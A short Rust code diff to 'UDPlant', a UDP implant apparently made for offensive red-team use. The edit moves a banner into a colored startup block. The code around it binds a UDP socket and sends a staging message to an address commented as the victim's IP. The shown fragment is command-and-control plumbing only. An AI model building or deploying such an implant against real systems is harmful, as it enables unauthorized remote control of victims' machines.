@@ -8,6 +8,10 @@ use std::io;
 use std::io::Write;
 
 fn main() {
+    println!("{}","
+    ###########################################################################
+    #      UDPlant - UDP implant made by trickster0 from Telspace Systems     #
+    ###########################################################################\r\n".green());
     let mut socket = UdpSocket::bind("0.0.0.0:42303").expect("Socket failed to open.");
     let mut buf = [0;9];
     let _incoming = socket.recv(&mut buf);
@@ -19,7 +23,6 @@ fn main() {
 }
 
 fn initiate(socket: &mut UdpSocket) {
-    println!("UDPlant - UDP implant made by trickster0 from Telspace Systems");
     println!("{}", "[+]Connection Initiated.".green());
     let stage1 = "int1".as_bytes();
     socket.send_to(&stage1,"0.0.0.0:33267").expect("Failed to connect on UDP."); //victim's IP
